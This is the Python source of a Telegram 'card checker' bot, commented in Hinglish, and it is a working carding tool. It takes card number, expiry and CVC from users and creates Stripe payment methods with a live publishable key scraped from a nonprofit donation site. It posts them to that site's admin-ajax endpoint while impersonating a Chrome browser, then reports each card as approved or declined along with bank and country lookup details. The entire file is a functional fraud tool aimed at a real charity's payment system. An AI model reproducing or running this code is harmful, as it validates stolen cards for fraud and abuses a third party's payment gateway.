
#stripe based chkr  source code 
#---- this is all code ---- 
import logging
import warnings
import time
from telegram.ext import Updater, CommandHandler
from curl_cffi import requests as cffi_requests
import requests
 
#kuch warning aajata hai uska code
#isko hatatna matttt 
 
warnings.filterwarnings("ignore", category=UserWarning)
 
#configuration aapna telegram bot token dalna hai yaha 
 
 
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN" #--- yout bot token --- 
STRIPE_URL_STEP1 = "https://api.stripe.com/v1/payment_methods"
SITE_URL_STEP2 = "https://www.act-today.org/wp-admin/admin-ajax.php"
 
 
#pk dalo sites ka 
STRIPE_PK = "pk_live_51BPEUlCoZJ6KjGTBhIzXW69bEoZCGlIgAS2yC4uQpnvAWAKsCDY9yzCwsGNCmakClXKGSH9f21W0w0rNgBBW0zrS00wkPsw4DD"
 
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
 
# --- HELPER FUNCTIONS ---
def get_bin_details(card_number):
    bin_number = card_number[:6]
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get('bank', {}).get('name', 'N/A'),
                "country": f"{data.get('country', {}).get('name', 'N/A')} {data.get('country', {}).get('emoji', '')}",
            }
        return None
    except Exception:
        return None
 
#abb payment function logic yaha se suru hoga 
def process_card_payment(card_number, exp_month, exp_year, cvc):
    # Session banate hain jo browser ki tarah cookies aur headers sambhalega
    session = cffi_requests.Session(impersonate="chrome120")
    
    # Headers 100% from your screenshot
    session.headers.update({
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.act-today.org',
        'Referer': 'https://www.act-today.org/donate-now/',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    })
 
    #abb stripe gateways ke sath direct baat hoga and pm…… capture karegaaaa  mene code ko iss tarikese desgine kiya hai full working hoga 
    
    
    try:
        logger.info("Step 1: Creating Payment Method from Stripe...")
        stripe_payload_s1 = {
            'type': 'card', 'card[number]': card_number, 'card[exp_month]': exp_month,
            'card[exp_year]': exp_year, 'card[cvc]': cvc, 'key': STRIPE_PK,
        }
        response_s1 = requests.post(STRIPE_URL_STEP1, data=stripe_payload_s1, timeout=15)
        result_s1 = response_s1.json()
        
        if 'id' in result_s1:
            payment_method_id = result_s1['id']
        else:
            decline_reason = result_s1.get('error', {}).get('message', 'Could not create PM.')
            return "Declined ❌", decline_reason
            
    except Exception as e:
        return "Error ❌", f"Exception in Step 1: {e}"
 
    # === STEP 2: Website ko pm_... ID Bhejna (Request 1) ===
    try:
        logger.info(f"Step 2: Sending PM ID {payment_method_id} to the website...")
        site_payload_s2 = {
            'action': 'gf_stripe_create_payment_intent', 'nonce': 'gf_stripe_payment_intent_nonce',
            'payment_method[id]': payment_method_id, 'payment_method[object]': 'payment_method',
            'payment_method[billing_details][address][postal_code]': '10080',
            'payment_method[billing_details][email]': 'khatridiwas@gmail.com', 'payment_method[billing_details][name]': 'diwas khatri',
            'payment_method[card][brand]': 'visa', 'payment_method[card][country]': 'US',
            'payment_method[card][exp_month]': exp_month, 'payment_method[card][exp_year]': exp_year,
            'payment_method[card][last4]': card_number[-4:], 'currency': 'USD', 'amount': '50', 'feed_id': '1',
        }
        session.post(SITE_URL_STEP2, data=site_payload_s2, timeout=20)
        # Hum iske response ko ignore karenge, kyunki yeh hamesha '0' hota hai
 
    except Exception as e:
        return "Error ❌", f"Exception in Step 2: {e}"
 
    # === STEP 3: Asli Result Check Karna (Request 2 - THE REAL MAGIC) ===
    try:
        time.sleep(4) # Server ko process karne ke liye thoda samay dete hain
        logger.info("Step 3: Checking for the real success response...")
        
        #abb payload ko check karke batayega ki Declined / APPROVEDD 
        check_payload = {
            'action': 'gform_get_config',
            'config_path': 'gform_theme_config/common/form/product_meta/1'
        }
        
        response_check = session.post(SITE_URL_STEP2, data=check_payload, timeout=10)
        raw_response_text = response_check.text.strip()
        
        if '"success":true' in raw_response_text.lower():
            return "Approved ✅", "Card added successfully"
        else:
            return "Declined ❌", "Card Declined "
 
    except Exception as e:
        return "Error ❌", f"Exception in Step 3: {e}"
 
#telegram bot cmds likr (/au ) (#diwas)
def start(update, context):
    update.message.reply_text("Welcome! Use /au CARD|MM|YYYY|CVC to check a card.")
 
def handle_auth(update, context):
    start_time = time.time()
    sent_message = update.message.reply_text("`Processing...`", parse_mode='Markdown')
    try:
        card_data_text = " ".join(context.args)
        parts = card_data_text.split('|')
        card_number, exp_month, exp_year, cvc = [p.strip() for p in parts]
        
        status, message = process_card_payment(card_number, exp_month, exp_year, cvc)
        
        bin_info = get_bin_details(card_number)
        
        end_time = time.time()
        time_taken = f"{end_time - start_time:.2f}s"
        
        if "Approved" in status:
            final_message = (
                f"┏  APPROVED ✅\n"
                f"┃\n"
                f"┣ 💳 Card: `{card_number}`\n"
                f"┣  GATE: `Stripe Custom Gate`\n"
                f"┣ 応答 Response: `{message}`\n"
                f"┃\n"
                f"┣ 🏦 Bank: `{bin_info['bank'] if bin_info else 'N/A'}`\n"
                f"┣ 🏳️ Country: `{bin_info['country'] if bin_info else 'N/A'}`\n"
                f"┣ ⏳ Time: `{time_taken}`\n"
                f"┃\n"
                f"┗ dev ::- [Diwas 🇳🇵](https://t.me/Rar_Xd)"
            )
        else:
            final_message = (
                f"┏ DECLINED ❌\n"
                f"┃\n"
                f"┣ 💳 Card: `{card_number}`\n"
                f"┣ GATE: `Stripe Gate `\n"
                f"┣ 応答 Response: `{message}`\n"
                f"┃\n"
                f"┣ 🏦 Bank: `{bin_info['bank'] if bin_info else 'N/A'}`\n"
                f"┣ 🏳️ Country: `{bin_info['country'] if bin_info else 'N/A'}`\n"
                f"┣ ⏳ Time: `{time_taken}`\n"
                f"┃\n"
                f"┗ dev ::- [Diwas 🇳🇵](https://t.me/Rar_Xd)"
            )
        #yeh code Vs Code Mai Diwas Ke Dwara Likhaa Gaya Hai 
        sent_message.edit_text(final_message, parse_mode='Markdown', disable_web_page_preview=True)
 
    except Exception as e:
        logger.error(f"Main handler error: {e}")
        sent_message.edit_text(f"`❌ An unexpected error occurred: {e}`", parse_mode='Markdown')
 
def main():
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("au", handle_auth))
    updater.start_polling()
    logger.info("The Final, 'Best Checker' Bot has started polling.")
    updater.idle()
 
if __name__ == '__main__':
    main()
